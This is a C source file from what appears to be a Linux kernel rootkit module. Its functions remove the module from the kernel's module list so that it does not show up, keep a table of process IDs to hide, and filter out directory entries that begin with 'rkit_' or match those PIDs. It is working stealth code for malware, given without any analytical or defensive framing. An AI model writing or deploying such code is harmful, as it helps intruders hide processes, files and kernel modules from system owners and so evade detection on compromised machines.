#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include "hide.h"

#define HIDDEN_PREFIX "rkit_"
#define MAX_HIDDEN_PIDS 64

static struct list_head *g_prev_module;
static pid_t g_hidden_pids[MAX_HIDDEN_PIDS];
static int g_hidden_pid_count;
static int g_hidden;

void hide_self(void)
{
    if (g_hidden)
        return;
    g_prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    g_hidden = 1;
}

void unhide_self(void)
{
    if (!g_hidden)
        return;
    list_add(&THIS_MODULE->list, g_prev_module);
    g_hidden = 0;
}

void hide_add_pid(pid_t pid)
{
    if (g_hidden_pid_count < MAX_HIDDEN_PIDS)
        g_hidden_pids[g_hidden_pid_count++] = pid;
}

int hide_should_filter(const char *name)
{
    int i;
    long pid;
    char *end;

    if (strncmp(name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0)
        return 1;

    pid = simple_strtol(name, &end, 10);
    if (end != name) {
        for (i = 0; i < g_hidden_pid_count; i++) {
            if ((pid_t)pid == g_hidden_pids[i])
                return 1;
        }
    }

    return 0;
}
